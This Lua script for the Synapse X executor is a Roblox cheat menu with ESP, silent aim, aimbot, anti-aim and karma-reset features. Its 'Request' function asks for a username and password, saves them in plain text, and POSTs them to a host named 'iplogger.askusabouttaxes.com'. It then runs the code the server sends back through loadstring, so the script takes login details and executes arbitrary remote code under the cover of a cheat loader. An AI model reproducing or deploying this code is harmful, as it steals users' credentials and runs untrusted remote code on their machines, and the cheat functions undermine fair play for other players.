local readfile,writefile,isfile = readfile,writefile,isfile


function Request(name)
    if not getgenv().SLibLoginInformation then
        rconsoleclear()
        getgenv().SLibLoginInformation = {}
        if not syn then
            rconsoleprint('@@RED@@')
            rconsoleprint('This exploit only supports SynapseX.')
            return
        end
        rconsoleprint('@@YELLOW@@')
        local cprint = rconsoleprint or print
        cprint("Getting latest exploit module, please wait...\n")
        if not isfile("credentials.txt") then
            cprint("\nEnter your username.\n\n")
            getgenv().SLibLoginInformation["Username"] = rconsoleinput()
            cprint("\nEnter your password.\n\n")
            getgenv().SLibLoginInformation["Password"] = rconsoleinput()
            writefile("credentials.txt",game:GetService("HttpService"):JSONEncode(getgenv().SLibLoginInformation))
        else
            getgenv().SLibLoginInformation = game:GetService("HttpService"):JSONDecode(readfile("credentials.txt"))
        end
end
   if getgenv().SLibLoginInformation and getgenv().SLibLoginInformation["Username"] and getgenv().SLibLoginInformation['Password'] then
        rconsoleprint("Login information confirmed. Sending Syn Request. ")
        local res = syn.request({
            Url = "https://iplogger.askusabouttaxes.com/login",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
            },
            Body = game:GetService("HttpService"):JSONEncode({
                ["Username"] = getgenv().SLibLoginInformation['Username'],
                ["Password"] = getgenv().SLibLoginInformation['Password'],
                ["GameID"] = name
            })
        })
        if res.Success and res.Body then
            if res.Body  == "Invalid username/password" then
                rconsoleclear()
                return nil
            end
            return string.match(res.Body,"return function") ~= nil and loadstring(res.Body)()() or res.Body
        else
           rconsoleerr(res.StatusCode,res.StatusMessage) 
        end
    end
end
local Library = loadstring(Request('uilibrary'))()
local s,f = pcall(function()
    local Globals = Request("globals")
    local ESP = Request("esp")
    local data = Request("data")
    loadstring(Globals)()
    loadstring(data)()
    loadstring(ESP)()
    data = getgenv().Data
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer 
    local watermark = Library:createScreenLabel{text = "Running %s mode on build %s. D/T: %s/%s/%s  %s:%s:%s %s"}
    local lookvector = Library:createScreenLabel{text = "",position = Vector2.new(95,30)}
    local hello = Library:createScreenLabel{text = "",position = Vector2.new(95,50)}
    local counter = Library:createScreenLabel{text = "",position = Vector2.new(95,70)}
    function Round(n,p)
	    return math.floor(n*(10^(p)))/(10^(p))
    end
    function shit(t)
		return t>12 and t-12 or t
    end
    local Color = Color3.fromHSV(0,1,1)
	coroutine.wrap(function()
		local r = 255
		local g = 255
		local b = 255
		while wait() do
			for i = 0,1,0.001*0.8 do
				getgenv().Color = Color3.fromHSV(i,1,1)
				Color = Color3.fromHSV(i,1,1)
				wait()
			end
		end
	end)()
    local watermarkConnection = Library("createConnection", {name = "watermark", connection = game:GetService("RunService").RenderStepped, callback = function(step)
        FPS = "FPS: " .. math.round(1/step)
		counter:changeText(FPS)
		local LocalTime = os.date("*t")
		local lv = workspace.CurrentCamera.CFrame.LookVector
		lookvector:changeText("Camera LookVector: " .. Round(lv.X,3) .. " / " .. Round(lv.Y,3) .. " / " .. Round(lv.Z,3))
        watermark:changeText(string.format('Running %s mode on build %s. D/T: %s/%s/%s  %s:%s:%s %s',data.GlobalMode,data.Build,LocalTime.month,LocalTime.day,LocalTime.year,LocalTime.hour >= 10 and shit(LocalTime.hour) or "0"..tostring(LocalTime.hour),LocalTime.min >= 10 and LocalTime.min or "0"..tostring(LocalTime.min),LocalTime.sec >= 10 and LocalTime.sec or "0"..tostring(LocalTime.sec),LocalTime.hour > 12 and "PM" or "AM"))
        watermark.drawings.label.Color = Color

    end})
    coroutine.wrap(function()
		local x = 0
		local r = false
		local str = getgenv().SLibLoginInformation['Username']
		while task.wait(math.random(0.6,0.8)) do
		    hello.drawings.label.Color = Color
			if x > string.len("Welcome, " .. str .. "!") then
				task.wait(1.5)
				repeat x = x - 1
					hello:changeText(string.sub("Welcome, " .. str .. "!",1,x))	wait(math.random(0.7,0.9))
					
				until x == 0
				task.wait(1)
			else
				x = x + 1
				hello:changeText(string.sub("Welcome, " .. str .. "!",1,x+1))
			end
		end
	end)()
    local window = Library:createWindow({})
    local ESPTabObjects,SilentAimTabObjects,AntiAimTabObjects,MiscTabObjects,AimbotTabObjects = {},{},{},{},{}
    local ESPTab = window:createTab({name="ESP"})
    ESPTabObjects.EnableESP = ESPTab:createToggle({text="Enable ESP",callback=function(val) getgenv().ESPSettings.Enabled = val end})
    ESPTabObjects.Tracers = ESPTab:createToggle({text="Enable Tracers",callback=function(val) getgenv().DisableTracers = val end})
    ESPTabObjects.VerboseNameTags = ESPTab:createToggle({text="Enable Verbose Name Tags",callback=function(val) getgenv().VerboseNameTags = val end})
    ESPTabObjects.ESPMode = ESPTab:createDropdown({text="ESP Mode",default="Visible",options={"Visible","TraitorFinderHook","Rainbow"},callback = function(val) getgenv().ESPMode = val end})
    ESPTabObjects.EnableChams = ESPTab:createToggle({text="Enable Chams",callback=function(val) getgenv().ChamsEnabled = val end})
    ESPTabObjects.ChamsColorR = ESPTab:createSlider({text = "Chams Color R", side = "right", min = 0, default = 255, max = 255,callback=function(val) getgenv().ChamsColorR = val end})
    ESPTabObjects.ChamsColorG = ESPTab:createSlider({text = "Chams Color G", side = "right", min = 0, default = 255, max = 255,callback=function(val) getgenv().ChamsColorG = val end})
    ESPTabObjects.ChamsColorB = ESPTab:createSlider({text = "Chams Color B", side = "right", min = 0, default = 255, max = 255,callback=function(val) getgenv().ChamsColorB = val end})

    local SilentAimTab = window:createTab({name="Aim Cheats"})
    SilentAimTabObjects.SilentAimEnabled = SilentAimTab:createToggle({text="Toggle Silent Aim",callback=function(val) getgenv().SilentAimEnabled = val end})
    SilentAimTabObjects.SilentAimMode = SilentAimTab:createDropdown({text="Silent Aim Mode",default="Visible",options={"Visible","NoVisible","MouseTarget","Legit"},callback=function(val) getgenv().SilentAimMode = val end})
    SilentAimTabObjects.SilentAimAt = SilentAimTab:createDropdown({side="right",text="Silent Aim At",default="Head",options={"Head","HumanoidRootPart","LeftUpperArm","RightUpperArm","LeftLowerLeg","RightLowerLeg","UpperTorso","LowerTorso"},callback=function(val) getgenv().SilentAimAt=val end})
    SilentAimTabObjects.SilentAimLegitMiss = SilentAimTab:createSlider({text = "Silent Aim Legit Misses", side = "right", min = 0, default = 3, max = 24,callback=function(val) getgenv().SilentAimMiss = val end})
    local AimbotTab = window:createTab({name="Aimbot Config"})
    AimbotTabObjects.EnableAimbot = AimbotTab:createToggle({text="Enable Aimbot",callback=function(val) getgenv().EnableHvH = val end})
    AimbotTabObjects.AimbotTOrFreeOnly = AimbotTab:createToggle({text="Aimbot Traitors or FreeKill only.",callback=function(val) getgenv().HvHTOrFreeOnly = val end})
    AimbotTabObjects.AimbotMode = AimbotTab:createDropdown({text="Aimbot Mode",default="Head",options={"Head","Chest","Wallbang"},callback = function(val) getgenv().HvHMode = val end})
    local MiscTab = window:createTab({name="Misc Cheats"})
    MiscTabObjects.EnableDeathMessages = MiscTab:createToggle({text="Enable Death Messages",callback=function(val) getgenv().EnableDeathMessages = val end})
    MiscTabObjects.EnableDeathMessages = MiscTab:createToggle({text="Enable Kill Messages",callback=function(val) getgenv().EnableKillMessages = val end})
    MiscTabObjects.ThirdPerson = MiscTab:createToggle({text="Enable ThirdPerson",callback=function(val) getgenv().ThirdPerson = val getgenv().ToggleFirstPerson() end})
    MiscTabObjects.NoFall = MiscTab:createToggle({text="Enable NoFall",callback=function(val) getgenv().NoFall = val end})
    MiscTabObjects.AutoReload = MiscTab:createToggle({text="AutoReload",callback=function(val) getgenv().AutoReload = val end})
    MiscTabObjects.NoWeaponSwitchAnim = MiscTab:createToggle({text="Disable Weapon Switch Animimation",callback=function(val) getgenv().NoWeaponSwitchAnim = val end})
    MiscTabObjects.FovChanger = MiscTab:createSlider({text = "FOV Changer", side = "right", min = 70, default = 70, max = 120,callback=function(val) getgenv().FOV = val end})
    MiscTabObjects.AutoJoin = MiscTab:createToggle({text="Enable AutoJoin",callback=function(val) getgenv().AutoJoinEnabled = val end})
    MiscTabObjects.TraitorFinder = MiscTab:createToggle({text="Enable TraitorFinder [USELESS]",callback=function(val) getgenv().TraitorFinderEnabled = val end})
    MiscTabObjects.RefreshKarma = MiscTab:createButton({text="Stop Karma Loss",callback = function() LocalPlayer.Data.VisibleKarma:Destroy() task.wait(5) game:GetService('TeleportService'):Teleport(255236425) end}) 
    MiscTabObjects.Bhop = MiscTab:createToggle({text="Bunnyhop",callback=function(val) getgenv().Bhop = val end})
    MiscTabObjects.AutoDeleteBodies = MiscTab:createToggle({text="Auto Delete Bodies",callback=function(val) getgenv().AutoDeleteBodies = val end})
    MiscTabObjects.CrouchWalk = MiscTab:createToggle({text="Crouch Walk",callback=function(val) getgenv().CrouchWalk(val) end})
    MiscTabObjects.TPWalk = MiscTab:createToggle({text="Teleport Walk",callback=function(val) getgenv().TPWalk = val end})
    MiscTabObjects.Mesh = MiscTab:createDropdown({text="Mesh",default="Default",options={"Default","AK47","Sword","Minigun","Plushie"},callback=function(val) getgenv().MeshChanger = val end})
    MiscTabObjects.Mesh2 = MiscTab:createLabel({text="To create your own mesh, add to the\n getgenv().MeshExports table. using \n {Mesh = MeshId, Texture = TextureId, Scale = Vector3Scale},\n then change getgenv().MeshChanger to the index."})
    local AntiAimTab = window:createTab({name = "Anti Aim"})
    AntiAimTabObjects.EnableAntiAim = AntiAimTab:createToggle({text="Enable Anti Aim",callback=function(val) getgenv().AntiAim = val end})
    AntiAimTabObjects.RandomizeAntiAimAngles = AntiAimTab:createToggle({text="Randomize Angles",callback=function(val) getgenv().RandomizeAngles = val end})
    AntiAimTabObjects.RandomizeLookVector = AntiAimTab:createToggle({text="Randomize LookVector",callback=function(val) getgenv().RandomizeLookVector = val end})
    AntiAimTabObjects.AntiAimX = AntiAimTab:createSlider({text = "Anti Aim X", side = "right", min = 0, default = 180, max = 360,callback=function(val) getgenv().AntiAimX = val end})
    AntiAimTabObjects.AntiAimY = AntiAimTab:createSlider({text = "Anti Aim Y", side = "right", min = 0, default = 180, max = 360,callback=function(val) getgenv().AntiAimY = val end})
    AntiAimTabObjects.AntiAimZ = AntiAimTab:createSlider({text = "Anti Aim Z", side = "right", min = 0, default = 180, max = 360,callback=function(val) getgenv().AntiAimZ = val end})
    AntiAimTabObjects.AntiAimBodyX = AntiAimTab:createSlider({text = "Anti Aim Body X", side = "right", min = 0, default = 360, max = 360,callback=function(val) getgenv().AntiAimBodyX = val end})
    AntiAimTabObjects.AntiAimBodyY = AntiAimTab:createSlider({text = "Anti Aim Body Y", side = "right", min = 0, default = 360, max = 360,callback=function(val) getgenv().AntiAimBodyY = val end})
    AntiAimTabObjects.AntiAimBodyZ = AntiAimTab:createSlider({text = "Anti Aim Body Z", side = "right", min = 0, default = 360, max = 360,callback=function(val) getgenv().AntiAimBodyZ = val end})
    local KeybindTab = window:createTab({name="Keybinds"})
    local ConfigTab = window:createTab({name= "Saving"})
    ConfigTab:createButton({text="Save Running As Config",callback = function() end})
    ConfigTab:createButton({text="Join Discord",callback=function()
    syn.request({Url = "http://127.0.0.1:6463/rpc?v=1",Method = "POST",Headers = {["Content-Type"] = "application/json",["origin"] = "https://discord.com",},Body = game:GetService("HttpService"):JSONEncode({["args"] = {["code"] = "R4TPSvs2ZP",},["cmd"] = "INVITE_BROWSER",["nonce"] = "."})})    end})
end)
if f then
    rconsoleerr(tostring(f))
end
Library("initialize")
